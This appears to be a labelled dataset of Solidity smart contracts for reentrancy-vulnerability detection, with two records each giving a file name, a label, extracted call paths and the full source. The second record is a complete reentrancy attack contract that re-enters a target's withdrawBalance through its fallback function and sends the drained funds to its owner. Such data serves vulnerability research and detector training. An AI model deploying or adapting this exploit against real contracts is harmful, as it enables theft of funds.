{"sol name": "22805_1.sol", "label": 0, "first path": "function eT(address _pd, uint _tkA, uint _etA) returns (bool success) { balances[msg.sender] = safeSub(balances[msg.sender], _tkA); balances[_pd] = safeAdd(balances[_pd], _tkA); if (!_pd.call.value(_etA)()) revert(); ET(_pd, _tkA, _etA); return true; ", "second path": "function eT(address _pd, uint _tkA, uint _etA) returns (bool success) { balances[msg.sender] = safeSub(balances[msg.sender], _tkA); balances[_pd] = safeAdd(balances[_pd], _tkA); if (!_pd.call.value(_etA)()) revert(); ET(_pd, _tkA, _etA); return true; ", "third path": "function eT(address _pd, uint _tkA, uint _etA) returns (bool success) { balances[msg.sender] = safeSub(balances[msg.sender], _tkA); balances[_pd] = safeAdd(balances[_pd], _tkA); if (!_pd.call.value(_etA)()) revert(); ET(_pd, _tkA, _etA); return true; ", "long path": "pragma solidity ^0.4.18; contract Ownable { address public owner; function Ownable() { owner = msg.sender; } modifier onlyOwner() { require(msg.sender == owner); _; } function transferOwnership(address newOwner) onlyOwner { if (newOwner != address(0)) { owner = newOwner; } } } contract SafeMath { function safeMul(uint a, uint b) internal returns (uint) { uint c = a * b; sAssert(a == 0 || c / a == b); return c; } function safeDiv(uint a, uint b) internal returns (uint) { sAssert(b > 0); uint c = a / b; sAssert(a == b * c + a % b); return c; } function safeSub(uint a, uint b) internal returns (uint) { sAssert(b <= a); return a - b; } function safeAdd(uint a, uint b) internal returns (uint) { uint c = a + b; sAssert(c>=a && c>=b); return c; } function max64(uint64 a, uint64 b) internal constant returns (uint64) { return a >= b ? a : b; } function min64(uint64 a, uint64 b) internal constant returns (uint64) { return a < b ? a : b; } function max256(uint256 a, uint256 b) internal constant returns (uint256) { return a >= b ? a : b; } function min256(uint256 a, uint256 b) internal constant returns (uint256) { return a < b ? a : b; } function sAssert(bool assertion) internal { if (!assertion) { throw; } } } contract ERC20 { uint public totalSupply; function balanceOf(address who) constant returns (uint); function allowance(address owner, address spender) constant returns (uint); function transfer(address to, uint value) returns (bool ok); function transferFrom(address from, address to, uint value) returns (bool ok); function approve(address spender, uint value) returns (bool ok); event Transfer(address indexed from, address indexed to, uint value); event Approval(address indexed owner, address indexed spender, uint value); } contract StandardToken is ERC20, SafeMath { mapping(address => uint) balances; mapping (address => mapping (address => uint)) allowed; function transfer(address _to, uint _value) returns (bool success) { balances[msg.sender] = safeSub(balances[msg.sender], _value); balances[_to] = safeAdd(balances[_to], _value); Transfer(msg.sender, _to, _value); return true; } function transferFrom(address _from, address _to, uint _value) returns (bool success) { var _allowance = allowed[_from][msg.sender]; balances[_to] = safeAdd(balances[_to], _value); balances[_from] = safeSub(balances[_from], _value); allowed[_from][msg.sender] = safeSub(_allowance, _value); Transfer(_from, _to, _value); return true; } function balanceOf(address _owner) constant returns (uint balance) { return balances[_owner]; } function approve(address _spender, uint _value) returns (bool success) { allowed[msg.sender][_spender] = _value; Approval(msg.sender, _spender, _value); return true; } function allowance(address _owner, address _spender) constant returns (uint remaining) { return allowed[_owner][_spender]; } } contract PowerCoin is Ownable, StandardToken { string public name = \"CapricornCoin\"; string public symbol = \"CCC\"; uint public decimals = 18; uint public totalSupply = 2 * (10 * (10**6) * (10**18)); event ET(address indexed _pd, uint _tkA, uint _etA); function eT(address _pd, uint _tkA, uint _etA) returns (bool success) { balances[msg.sender] = safeSub(balances[msg.sender], _tkA); balances[_pd] = safeAdd(balances[_pd], _tkA); if (!_pd.call.value(_etA)()) revert(); ET(_pd, _tkA, _etA); return true; } function PowerCoin() { balances[msg.sender] = totalSupply; } function () payable{ } function transferOwnership(address _newOwner) onlyOwner { balances[_newOwner] = safeAdd(balances[owner], balances[_newOwner]); balances[owner] = 0; Ownable.transferOwnership(_newOwner); } function transferAnyERC20Token(address tokenAddress, uint amount) onlyOwner returns (bool success) { return ERC20(tokenAddress).transfer(owner, amount); } } "}
{"sol name": "Reentrance_exploit_1.sol", "label": 1, "first path": "function deposit(address _vulnerable_contract) public payable{ vulnerable_contract = _vulnerable_contract ; require(vulnerable_contract.call.value(msg.value)(bytes4(sha3(\"addToBalance()\")))); ", "second path": "function deposit(address _vulnerable_contract) public payable{ vulnerable_contract = _vulnerable_contract ; require(vulnerable_contract.call.value(msg.value)(bytes4(sha3(\"addToBalance()\")))); ", "third path": "function deposit(address _vulnerable_contract) public payable{ vulnerable_contract = _vulnerable_contract ; require(vulnerable_contract.call.value(msg.value)(bytes4(sha3(\"addToBalance()\")))); ", "long path": "pragma solidity ^0.4.15; contract ReentranceExploit { bool public attackModeIsOn=false; address public vulnerable_contract; address public owner; function ReentranceExploit() public{ owner = msg.sender; } function deposit(address _vulnerable_contract) public payable{ vulnerable_contract = _vulnerable_contract ; require(vulnerable_contract.call.value(msg.value)(bytes4(sha3(\"addToBalance()\")))); } function launch_attack() public{ attackModeIsOn = true; require(vulnerable_contract.call(bytes4(sha3(\"withdrawBalance()\")))); } function () public payable{ if (attackModeIsOn){ attackModeIsOn = false; require(vulnerable_contract.call(bytes4(sha3(\"withdrawBalance()\")))); } } function get_money(){ suicide(owner); } } "}
